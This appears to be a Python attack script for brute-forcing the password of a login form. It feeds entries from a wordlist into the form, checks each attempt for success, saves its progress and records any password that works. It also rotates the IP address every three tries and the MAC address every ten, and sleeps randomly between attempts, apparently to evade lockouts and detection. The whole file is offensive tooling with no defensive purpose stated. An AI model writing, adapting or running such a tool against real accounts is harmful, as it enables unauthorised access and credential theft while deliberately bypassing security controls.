from insert_to_form import Insert , Check , First_shot
from change_mac_address import MAC
from change_ip import IP 
from time import sleep
from random import randint


window = First_shot()


# LOAD THE STEP
with open("save.txt", 'r') as save:
    start = count = int(save.read())


with open("passwords.txt", 'r') as file:
        passwords = file.readlines()

        n = int(input("   how many tries : "))
        print(f"\n   estimated time : {n/15:.2} minutes")
        print("\n######################################################\n")


        for password in passwords[start:start+n]:

            # INSERT PASSWORD AND SEE IF IT IS CORRECT OR NOT
            Insert(password.strip()+'\n')

            if Check(window):
                print("\n   password found \n")
                print(f"-->   {count}")
                print(f"-->   {password}")
                with open("found.txt", 'a') as found:
                    found.write(f"{count} - {password}")
                break


            # SAVE THE PROGRESS
            count+=1
            with open("save.txt", 'w') as save:
                save.write(str(count))


            # PROTECTION
            if count%3==0:
                IP()
            if count%10==0:
                MAC()
            sleep(randint(1,5))



